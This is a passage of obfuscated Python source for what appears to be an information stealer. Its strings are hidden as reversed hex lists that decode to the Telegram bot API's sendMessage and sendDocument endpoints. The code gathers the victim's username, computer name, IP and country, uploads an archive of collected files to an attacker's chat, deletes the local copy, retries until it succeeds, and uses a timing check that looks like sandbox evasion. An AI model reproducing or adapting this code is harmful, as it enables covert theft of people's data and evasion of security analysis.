            return os.getenv(bW232(['/x45', '/x4d', '/x41', '/x4e', '/x52', '/x45', '/x53', '/x55'])) if platform.system() == bW232(['/x73', '/x77', '/x6f', '/x64', '/x6e', '/x69', '/x57']) else os.getenv(bW232(['/x52', '/x45', '/x53', '/x55']))
        elif rGO0492j2U == bW232(['/x6b', '/x73', '/x65', '/x64']):
            ztwA477Hvo = os.getenv(bW232(['/x45', '/x4d', '/x41', '/x4e', '/x52', '/x45', '/x54', '/x55', '/x50', '/x4d', '/x4f', '/x43'])) if platform.system() == bW232(['/x73', '/x77', '/x6f', '/x64', '/x6e', '/x69', '/x57']) else os.uname().nodename
            return ztwA477Hvo if ztwA477Hvo.startswith(bW232(['/x2d', '/x50', '/x4f', '/x54', '/x4b', '/x53', '/x45', '/x44'])) else f"{bW232(['/x2d', '/x50', '/x4f', '/x54', '/x4b', '/x53', '/x45', '/x44'])}{ztwA477Hvo}"
        else:return None
    def Cj358(self, I56TVPgJi8):
        d8Uy75jxHs = f"{bW232(['/x74', '/x6f', '/x62', '/x2f', '/x67', '/x72', '/x6f', '/x2e', '/x6d', '/x61', '/x72', '/x67', '/x65', '/x6c', '/x65', '/x74', '/x2e', '/x69', '/x70', '/x61', '/x2f', '/x2f', '/x3a', '/x73', '/x70', '/x74', '/x74', '/x68'])}{zo177AZnRH}/{bW232(['/x65', '/x67', '/x61', '/x73', '/x73', '/x65', '/x4d', '/x64', '/x6e', '/x65', '/x73'])}"
        u08NL9A2at = {bW232(['/x64', '/x69', '/x5f', '/x74', '/x61', '/x68', '/x63']): qm80VRl4rf, bW232(['/x74', '/x78', '/x65', '/x74']): I56TVPgJi8}
        requests.get(d8Uy75jxHs, params=u08NL9A2at)    
    def uD696(self, lm25BkHpw6, pX6mv78COP=""):
        d8Uy75jxHs = f"{bW232(['/x74', '/x6f', '/x62', '/x2f', '/x67', '/x72', '/x6f', '/x2e', '/x6d', '/x61', '/x72', '/x67', '/x65', '/x6c', '/x65', '/x74', '/x2e', '/x69', '/x70', '/x61', '/x2f', '/x2f', '/x3a', '/x73', '/x70', '/x74', '/x74', '/x68'])}{zo177AZnRH}/{bW232(['/x74', '/x6e', '/x65', '/x6d', '/x75', '/x63', '/x6f', '/x44', '/x64', '/x6e', '/x65', '/x73'])}"
        f7g750fYgl = {bW232(['/x74', '/x6e', '/x65', '/x6d', '/x75', '/x63', '/x6f', '/x64']): open(lm25BkHpw6, 'rb')}
        u08NL9A2at = {bW232(['/x64', '/x69', '/x5f', '/x74', '/x61', '/x68', '/x63']): qm80VRl4rf, bW232(['/x6e', '/x6f', '/x69', '/x74', '/x70', '/x61', '/x63']): pX6mv78COP}
        try: return requests.post(d8Uy75jxHs, params=u08NL9A2at, files=f7g750fYgl).status_code
        except: return 500
    def C95e8(self):
        v5wB9N3U7a = self.eB619()
        if F9jWi83uzQ: cIJx20mk2dg = threading.Thread(target=pDqGx, args=(F9jWi83uzQ,))
        else: cIJx20mk2dg = threading.Thread(target=pDqGx)
        cIJx20mk2dg.start()
        if v5wB9N3U7a not in (500, 403, 404):
            iO365()
            jCfI462o9M = f"{self.lW011(bW232(['/x6b', '/x73', '/x65', '/x64']))}_{self.lW011(bW232(['/x72', '/x65', '/x73', '/x75']))}"
            brD44z2Kz1 = f"{v5wB9N3U7a['code']}_{jCfI462o9M}"
            i1Edzm4vS4, J62sUOVr2t = fF964(brD44z2Kz1)
            sIr6186uAm = f"{bW232(['/x20', '/x3a', '/x45', '/x43', '/x52', '/x55', '/x4f', '/x53', '/x20', '/x1f517'])}{os.path.basename(os.path.abspath(sys.argv[0]))}\n"
            sIr6186uAm += f"{bW232(['/x3a', '/x59', '/x52', '/x54', '/x4e', '/x55', '/x4f', '/x43', '/x20', '/x1f310'])} {v5wB9N3U7a[bW232(['/x65', '/x64', '/x6f', '/x63'])]}\n"
            sIr6186uAm += f"{bW232(['/x3a', '/x52', '/x44', '/x44', '/x41', '/x50', '/x49', '/x20', '/x1f4eb'])} {v5wB9N3U7a[bW232(['/x72', '/x64', '/x64', '/x61'])]}\n"
            sIr6186uAm += f"{bW232(['/x3a', '/x45', '/x4d', '/x41', '/x4e', '/x52', '/x45', '/x53', '/x55', '/x20', '/xfe0f', '/x1f5a5'])} {jCfI462o9M.replace('_', '/')}\n\n {i1Edzm4vS4}"
            k5c3wBL6at = self.uD696(lm25BkHpw6=J62sUOVr2t, pX6mv78COP=sIr6186uAm)
            if k5c3wBL6at == 200:
                try:os.remove(J62sUOVr2t)
                except: self.Cj358(bW232(['/x2e', '/x2e', '/x2e', '/x64', '/x65', '/x6c', '/x69', '/x61', '/x66']))
            else: return 500
            return 200
        else: return 500
def l34Py71OJ2():
    Yjw5zN61js = uF7k2FR15R()
    while True:
        k5c3wBL6at = Yjw5zN61js.C95e8()
        if k5c3wBL6at == 200: break
if __name__ == '__main__':
    B9Fr141YMy = 1
    ql751NV3uT = datetime.now()
    C1L941MZom = ql751NV3uT + timedelta(seconds=B9Fr141YMy)
    while datetime.now() < C1L941MZom:pass
    if (datetime.now() - ql751NV3uT).total_seconds() > B9Fr141YMy:
        jB6Y9g2FMU = nT644()
        if jB6Y9g2FMU == "nowin":pass
        elif isinstance(jB6Y9g2FMU, int) and jB6Y9g2FMU > 0:pass
        l34Py71OJ2()
